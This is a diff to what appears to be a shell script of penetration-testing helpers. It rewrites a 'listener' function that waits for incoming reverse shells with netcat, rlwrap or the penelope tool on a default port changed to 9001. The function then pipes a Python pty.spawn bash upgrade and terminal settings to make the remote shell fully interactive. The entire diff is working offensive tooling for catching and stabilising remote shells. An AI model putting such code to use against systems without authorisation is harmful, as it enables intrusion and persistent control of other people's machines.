@@ -193,9 +193,19 @@ listener() {
     if [[ $1 ]]; then
         port=$1
     else
-        port=1337
+        port=9001
     fi
-    stty raw -echo; (echo export TERM=xterm;echo 'python3 -c "import pty;pty.spawn(\"/bin/bash\")" || python -c "import pty;pty.spawn(\"/bin/bash\")"' ;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)"; echo reset;cat) | nc -lvnp $port && reset
+    # check if penelope exists and if so use it
+    if [[ $(which penelope) ]]; then
+        penelope -p $port
+    else
+        # check if rlwrap exists and if so use it
+        if [[ $(which rlwrap) ]]; then
+            stty raw -echo; (echo export TERM=xterm;echo 'python3 -c "import pty;pty.spawn(\"/bin/bash\")" || python -c "import pty;pty.spawn(\"/bin/bash\")"' ;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)"; echo reset;cat) | rlwrap nc -lvnp $port && reset
+        else
+            stty raw -echo; (echo export TERM=xterm;echo 'python3 -c "import pty;pty.spawn(\"/bin/bash\")" || python -c "import pty;pty.spawn(\"/bin/bash\")"' ;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)"; echo reset;cat) | nc -lvnp $port && reset
+        fi
+    fi
 }
 
 # sshp username password host extr_args
